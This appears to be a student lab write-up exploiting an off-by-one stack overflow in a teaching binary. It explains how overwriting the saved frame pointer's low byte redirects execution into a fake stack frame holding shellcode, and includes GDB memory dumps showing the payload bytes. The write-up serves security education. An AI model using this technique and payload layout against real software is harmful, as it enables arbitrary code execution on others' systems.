Vulnerability: Off-by-one involves overflowing a buffer by just one byte, which often is the least 
significant byte of the sfp.

How it can be exploited: By overflowing the buffer and overwriting the least significant byte of the sfp, 
we can get the sfp to point to somewhere within the buffer, causing the machine to think it is pointing to
a valid stack rather than the buffer, in which we can provide an instruction to execute the shellcode. 

How we determined which address to jump to: Like before, we used info frame in GDB to find the location of 
the $ebp, and we print the address of the buffer to determine where to start our fake stack. We treat the 
beginning of the buffer as a "fake" stack, so we insert our shell code 8 bytes after the beginning of the
buffer (after the "$ebp" and "$eip"). The $eip's value is the address of the shell code, which is adjacent 
to it.

Sketch of Solution: After deteriming the address of the $ebp and the beginning of the buffer, we used the 
off-by-one vulnerability to point the $ebp to the beginning of the buffer. Each of the addresses we placed 
in our arg script were xor-ed to account for the flip function. In treating the buffer as a fake
stack, we placed 4 bytes of garbage as the fake sfp and the address of the shell code as the fake rip. We
also added 11 bytes of garbage after the shellcode in order to fill the entire buffer, and finally a 65th 
byte (least significant byte of the sfp) pointing back to the beginning of the buffer. We did not need to 
use the egg script to move the stack with environment variables because the addresses of the $ebp and the 
buffer differed only by one byte.

GDB Output:
Before:
(gdb) info frame
 Stack level 0, frame at 0xbffffd80:
  eip = 0x80483ed in invoke (agent-brown.c:19); saved eip 0x804841d
  called by frame at 0xbffffd90
  source language c.
  Arglist at 0xbffffd78, args:
    in=0xbfffff4c "AAAA`\335\337\237\313?~\251V(\021\340\250f'\251f,\220+\251\323\255n(\255v,\355\240\021\373\251\370`\355\240\310\374\337\337\337\017BIN\017SH", 'A' <repeats 11 times>, "\030"
  Locals at 0xbffffd78, Previous frame's sp is 0xbffffd80
  Saved registers:
   ebp at 0xbffffd78, eip at 0xbffffd7c
(gdb) x/50x &buf
0xbffffd38:     0x00000000      0xb7ff3fdc      0xbffffdf4      0x00000000
0xbffffd48:     0x00000000      0xb7e5f043      0x0804820e      0x00000000
0xbffffd58:     0x00c30000      0x00000001      0xbfffff34      0x0000002f
0xbffffd68:     0xbffffdbc      0xb7fd2000      0x080484b0      0x080482f0
0xbffffd78:     0xbffffd88      0x0804841d      0xbfffff4c      0xbffffd88
0xbffffd88:     0xbffffda8      0x0804845c      0xbfffff4c      0x0804965c
0xbffffd98:     0xbffffdb8      0xbffffdc0      0xb7fed270      0xbffffdc0
0xbffffda8:     0x00000000      0xb7e454d3      0x080484b0      0x00000000
0xbffffdb8:     0x00000000      0xb7e454d3      0x00000002      0xbffffe54
0xbffffdc8:     0xbffffe60      0xb7fdc858      0x00000000      0xbffffe1c
0xbffffdd8:     0xbffffe60      0x00000000      0x080481e0      0xb7fd2000
After:
(gdb) info frame
 Stack level 0, frame at 0xbffffd80:
  eip = 0x80483ff in invoke (agent-brown.c:20); saved eip 0x804841d
  called by frame at 0xbffffd40
  source language c.
  Arglist at 0xbffffd78, args:
    in=0xbfffff4c "AAAA`\335\337\237\313?~\251V(\021\340\250f'\251f,\220+\251\323\255n(\255v,\355\240\021\373\251\370`\355\240\310\374\337\337\337\017BIN\017SH", 'A' <repeats 11 times>, "\030"
  Locals at 0xbffffd78, Previous frame's sp is 0xbffffd80
  Saved registers:
   ebp at 0xbffffd78, eip at 0xbffffd7c
x/50x buf
0xbffffd38:     0x61616161      0xbffffd40      0x895e1feb      0xc0310876
0xbffffd48:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08
0xbffffd58:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff
0xbffffd68:     0x732f6e69      0x61616168      0x61616161      0x61616161
0xbffffd78:     0xbffffd38      0x0804841d      0xbfffff4c      0xbffffd88
0xbffffd88:     0xbffffda8      0x0804845c      0xbfffff4c      0x0804965c
0xbffffd98:     0xbffffdb8      0xbffffdc0      0xb7fed270      0xbffffdc0
0xbffffda8:     0x00000000      0xb7e454d3      0x080484b0      0x00000000
0xbffffdb8:     0x00000000      0xb7e454d3      0x00000002      0xbffffe54
0xbffffdc8:     0xbffffe60      0xb7fdc858      0x00000000      0xbffffe1c
0xbffffdd8:     0xbffffe60      0x00000000      0x080481e0      0xb7fd2000
0xbffffde8:     0x00000000      0x00000000      0x00000000      0xdc2864d5
0xbffffdf8:     0xeb7ac0c5      0x00000000      0x00000000      0x00000000